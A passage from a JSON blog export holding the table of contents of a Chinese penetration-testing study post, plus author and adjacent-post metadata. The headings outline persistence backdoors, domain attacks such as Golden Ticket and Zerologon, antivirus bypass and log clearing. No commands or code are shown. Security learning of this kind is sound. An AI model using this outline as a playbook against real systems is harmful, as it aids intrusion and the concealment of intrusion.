class=\"toc-text\">权限维持</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%B3%BB%E7%BB%9F%E5%90%8E%E9%97%A8\"><span class=\"toc-text\">系统后门</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Windows-2\"><span class=\"toc-text\">Windows</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1%E3%80%81%E5%AF%86%E7%A0%81%E8%AE%B0%E5%BD%95%E5%B7%A5%E5%85%B7\"><span class=\"toc-text\">1、密码记录工具</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2%E3%80%81%E5%B8%B8%E7%94%A8%E7%9A%84%E5%AD%98%E5%82%A8Payload%E4%BD%8D%E7%BD%AE\"><span class=\"toc-text\">2、常用的存储Payload位置</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3%E3%80%81Run-RunOnce-Keys\"><span class=\"toc-text\">3、Run&#x2F;RunOnce Keys</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#4%E3%80%81BootExecute-Key\"><span class=\"toc-text\">4、BootExecute Key</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#5%E3%80%81Userinit-Key\"><span class=\"toc-text\">5、Userinit Key</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#6%E3%80%81Startup-Keys\"><span class=\"toc-text\">6、Startup Keys</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#7%E3%80%81Services\"><span class=\"toc-text\">7、Services</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#8%E3%80%81Browser-Helper-Objects\"><span class=\"toc-text\">8、Browser Helper Objects</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#9%E3%80%81AppInit-DLLs\"><span class=\"toc-text\">9、AppInit_DLLs</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#10%E3%80%81%E6%96%87%E4%BB%B6%E5%85%B3%E8%81%94\"><span class=\"toc-text\">10、文件关联</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#11%E3%80%81bitsadmin\"><span class=\"toc-text\">11、bitsadmin</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#12%E3%80%81mof\"><span class=\"toc-text\">12、mof </span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#13%E3%80%81wmi\"><span class=\"toc-text\">13、wmi</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#14%E3%80%81Userland-Persistence-With-Scheduled-Tasks\"><span class=\"toc-text\">14、Userland Persistence With Scheduled Tasks</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#15%E3%80%81Netsh\"><span class=\"toc-text\">15、Netsh</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#16%E3%80%81Shim\"><span class=\"toc-text\">16、Shim</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#17%E3%80%81DLL%E5%8A%AB%E6%8C%81\"><span class=\"toc-text\">17、DLL劫持</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#18%E3%80%81DoubleAgent\"><span class=\"toc-text\">18、DoubleAgent </span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#19%E3%80%81waitfor-exe\"><span class=\"toc-text\">19、waitfor.exe </span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#20%E3%80%81AppDomainManager\"><span class=\"toc-text\">20、AppDomainManager</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#21%E3%80%81Office\"><span class=\"toc-text\">21、Office</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#22%E3%80%81CLR\"><span class=\"toc-text\">22、CLR</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#23%E3%80%81msdtc\"><span class=\"toc-text\">23、msdtc</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#24%E3%80%81Hijack-CAccPropServicesClass-and-MMDeviceEnumerato\"><span class=\"toc-text\">24、Hijack CAccPropServicesClass and MMDeviceEnumerato</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#25%E3%80%81Hijack-explorer-exe\"><span class=\"toc-text\">25、Hijack explorer.exe</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#26%E3%80%81Windows-FAX-DLL-Injection\"><span class=\"toc-text\">26、Windows FAX DLL Injection</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#27%E3%80%81%E7%89%B9%E6%AE%8A%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%94%AE%E5%80%BC\"><span class=\"toc-text\">27、特殊注册表键值</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#28%E3%80%81%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E5%90%8E%E9%97%A8\"><span class=\"toc-text\">28、快捷方式后门</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#29%E3%80%81Logon-Scripts\"><span class=\"toc-text\">29、Logon Scripts</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#30%E3%80%81Password-Filter-DLL\"><span class=\"toc-text\">30、Password Filter DLL</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#31%E3%80%81%E5%88%A9%E7%94%A8BHO%E5%AE%9E%E7%8E%B0IE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81\"><span class=\"toc-text\">31、利用BHO实现IE浏览器劫持</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Linux-2\"><span class=\"toc-text\">Linux</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#crontab\"><span class=\"toc-text\">crontab</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E7%A1%AC%E9%93%BE%E6%8E%A5sshd\"><span class=\"toc-text\">硬链接sshd</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#SSH-Server-wrapper\"><span class=\"toc-text\">SSH Server wrapper</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#SSH-keylogger\"><span class=\"toc-text\">SSH keylogger</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#Cymothoa-%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5backdoor\"><span class=\"toc-text\">Cymothoa_进程注入backdoor</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#rootkit\"><span class=\"toc-text\">rootkit</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#Tools\"><span class=\"toc-text\">Tools</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#WEB%E5%90%8E%E9%97%A8\"><span class=\"toc-text\">WEB后门</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F\"><span class=\"toc-text\">横向渗透</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F\"><span class=\"toc-text\">端口渗透</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-1\"><span class=\"toc-text\">端口扫描</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%AB%AF%E5%8F%A3%E7%88%86%E7%A0%B4\"><span class=\"toc-text\">端口爆破</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%AB%AF%E5%8F%A3%E5%BC%B1%E5%8F%A3%E4%BB%A4\"><span class=\"toc-text\">端口弱口令</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%AB%AF%E5%8F%A3%E6%BA%A2%E5%87%BA\"><span class=\"toc-text\">端口溢出</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%B8%B8%E8%A7%81%E7%9A%84%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3\"><span class=\"toc-text\">常见的默认端口</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#1%E3%80%81web%E7%B1%BB-web%E6%BC%8F%E6%B4%9E-%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95\"><span class=\"toc-text\">1、web类(web漏洞&#x2F;敏感目录)</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#2%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB-%E6%89%AB%E6%8F%8F%E5%BC%B1%E5%8F%A3%E4%BB%A4\"><span class=\"toc-text\">2、数据库类(扫描弱口令)</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#3%E3%80%81%E7%89%B9%E6%AE%8A%E6%9C%8D%E5%8A%A1%E7%B1%BB-%E6%9C%AA%E6%8E%88%E6%9D%83-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%B1%BB-%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">3、特殊服务类(未授权&#x2F;命令执行类&#x2F;漏洞)</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#4%E3%80%81%E5%B8%B8%E7%94%A8%E7%AB%AF%E5%8F%A3%E7%B1%BB-%E6%89%AB%E6%8F%8F%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E7%AB%AF%E5%8F%A3%E7%88%86%E7%A0%B4\"><span class=\"toc-text\">4、常用端口类(扫描弱口令&#x2F;端口爆破)</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#5%E3%80%81%E7%AB%AF%E5%8F%A3%E5%90%88%E8%AE%A1%E6%89%80%E5%AF%B9%E5%BA%94%E7%9A%84%E6%9C%8D%E5%8A%A1\"><span class=\"toc-text\">5、端口合计所对应的服务</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%9F%9F%E6%B8%97%E9%80%8F\"><span class=\"toc-text\">域渗透</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-1\"><span class=\"toc-text\">信息搜集</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#powerview-ps1\"><span class=\"toc-text\">powerview.ps1</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#BloodHound\"><span class=\"toc-text\">BloodHound</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E8%8E%B7%E5%8F%96%E5%9F%9F%E5%86%85DNS%E4%BF%A1%E6%81%AF\"><span class=\"toc-text\">获取域内DNS信息</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%8E%A7%E7%9A%84%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">获取域控的方法</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#SYSVOL\"><span class=\"toc-text\">SYSVOL</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#MS14-068-Kerberos\"><span class=\"toc-text\">MS14-068 Kerberos</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#SPN%E6%89%AB%E6%8F%8F\"><span class=\"toc-text\">SPN扫描</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#Kerberos%E7%9A%84%E9%BB%84%E9%87%91%E9%97%A8%E7%A5%A8\"><span class=\"toc-text\">Kerberos的黄金门票</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#Kerberos%E7%9A%84%E9%93%B6%E7%A5%A8%E5%8A%A1\"><span class=\"toc-text\">Kerberos的银票务</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%9F%9F%E6%9C%8D%E5%8A%A1%E8%B4%A6%E5%8F%B7%E7%A0%B4%E8%A7%A3\"><span class=\"toc-text\">域服务账号破解</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%87%AD%E8%AF%81%E7%9B%97%E7%AA%83\"><span class=\"toc-text\">凭证盗窃</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#NTLM-relay\"><span class=\"toc-text\">NTLM relay</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#Kerberos%E5%A7%94%E6%B4%BE\"><span class=\"toc-text\">Kerberos委派</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AE\"><span class=\"toc-text\">地址解析协议</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#Zerologon\"><span class=\"toc-text\">Zerologon</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#noPac\"><span class=\"toc-text\">noPac</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#ADCS\"><span class=\"toc-text\">ADCS</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#CVE-2022-26923\"><span class=\"toc-text\">CVE-2022-26923</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E8%8E%B7%E5%8F%96AD%E5%93%88%E5%B8%8C\"><span class=\"toc-text\">获取AD哈希</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#AD%E6%8C%81%E4%B9%85%E5%8C%96\"><span class=\"toc-text\">AD持久化</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E6%8C%81%E4%B9%85%E6%80%A7%E6%8A%80%E5%B7%A7\"><span class=\"toc-text\">活动目录持久性技巧</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#Security-Support-Provider\"><span class=\"toc-text\">Security Support Provider</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#SID-History\"><span class=\"toc-text\">SID History</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#AdminSDHolder%EF%BC%86SDProp\"><span class=\"toc-text\">AdminSDHolder＆SDProp </span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E7%BB%84%E7%AD%96%E7%95%A5\"><span class=\"toc-text\">组策略</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#Hook-PasswordChangeNotify\"><span class=\"toc-text\">Hook PasswordChangeNotify</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#Kerberoasting%E5%90%8E%E9%97%A8\"><span class=\"toc-text\">Kerberoasting后门</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#AdminSDHolder\"><span class=\"toc-text\">AdminSDHolder</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#Delegation\"><span class=\"toc-text\">Delegation</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E9%BB%84%E9%87%91%E8%AF%81%E4%B9%A6\"><span class=\"toc-text\">黄金证书</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%85%B6%E4%BB%96-1\"><span class=\"toc-text\">其他</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E5%9F%9F%E5%86%85%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">域内主机提权</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#Exchange%E7%9A%84%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">Exchange的利用</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#TIPS\"><span class=\"toc-text\">TIPS</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7\"><span class=\"toc-text\">相关工具</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%9C%A8%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E4%B8%8A%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F\"><span class=\"toc-text\">在远程系统上执行程序</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#IOT%E7%9B%B8%E5%85%B3\"><span class=\"toc-text\">IOT相关</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%B8%AD%E9%97%B4%E4%BA%BA\"><span class=\"toc-text\">中间人</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%A7%84%E9%81%BF%E6%9D%80%E8%BD%AF%E5%8F%8A%E6%A3%80%E6%B5%8B\"><span class=\"toc-text\">规避杀软及检测</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Bypass-Applocker\"><span class=\"toc-text\">Bypass Applocker</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#BypassAV\"><span class=\"toc-text\">BypassAV</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86\"><span class=\"toc-text\">痕迹清理</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Windows%E6%97%A5%E5%BF%97%E6%B8%85%E9%99%A4\"><span class=\"toc-text\">Windows日志清除</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%A0%B4%E5%9D%8FWindows%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E5%8A%9F%E8%83%BD\"><span class=\"toc-text\">破坏Windows日志记录功能</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Metasploit\"><span class=\"toc-text\">Metasploit</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3389%E7%99%BB%E9%99%86%E8%AE%B0%E5%BD%95%E6%B8%85%E9%99%A4\"><span class=\"toc-text\">3389登陆记录清除</span></a></li></ol></li></ol>","author":{"name":"Myprefer","slug":"blog-author","avatar":"https://gravatar.com/avatar/d195051819ce742212020a79d768fb6c?size=256&cache=1710768150791","link":"https://github.com/Myprefer","description":"An ordinary learner","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"WEB攻防-通用漏洞","uid":"11932efbcdc3039b003ba34e280dee13","slug":"WEB攻防-通用漏洞","date":"2024-03-05T15:07:08.000Z","updated":"2024-04-21T12:31:45.059Z","comments":true,"path":"api/articles/WEB攻防-通用漏洞.json","keywords":null,"cover":null,"text":"WEB攻防-通用漏洞大型靶场Vulhub - Docker-Compose file for vulnerability environment SQL注入-补...","permalink":"/post/WEB攻防-通用漏洞","photos":[],"count_time":{"symbolsCount":"13k","symbolsTime":"12 mins."},"categories":[],"tags":[],"author":{"name":"Myprefer","slug":"blog-author","avatar":"https://gravatar.com/avatar/d195051819ce742212020a79d768fb6c?size=256&cache=1710768150791","link":"https://github.com/Myprefer","description":"An ordinary learner","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"WEB攻防-特性漏洞","uid":"b69c40d42a331389a30f55c12f4711cf","slug":"WEB攻防-特性漏洞","date":"2024-03-03T06:48:26.000Z","updated":"2024-03-05T15:55:59.512Z","comments":true,"path":"api/articles/WEB攻防-特性漏洞.json","keywords":null,"cover":[],"text":"ASP安全 常用组合: windows+IIS+ASP+Access(sql server) 安全问题:MDB默认下载 access数据库文件后缀名一般为asp...","permalink":"/post/WEB攻防-特性漏洞","photos":[],"count_time":{"symbolsCount":"5.3k","symbolsTime":"5 mins."},"categories":[],"tags":[{"name":"网络安全","slug":"网络安全","count":21,"path":"api/tags/网络安全.json"},{"name":"学习日志","slug":"学习日志","count":21,"path":"api/tags/学习日志.json"},{"name":"小迪安全","slug":"小迪安全","count":8,"path":"api/tags/小迪安全.json"},{"name":"WEB攻防","slug":"WEB攻防","count":3,"path":"api/tags/WEB攻防.json"}],"author":{"name":"Myprefer","slug":"blog-author","avatar":"https://gravatar.com/avatar/d195051819ce742212020a79d768fb6c?size=256&cache=1710768150791","link":"https://github.com/Myprefer","description":"An ordinary learner","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}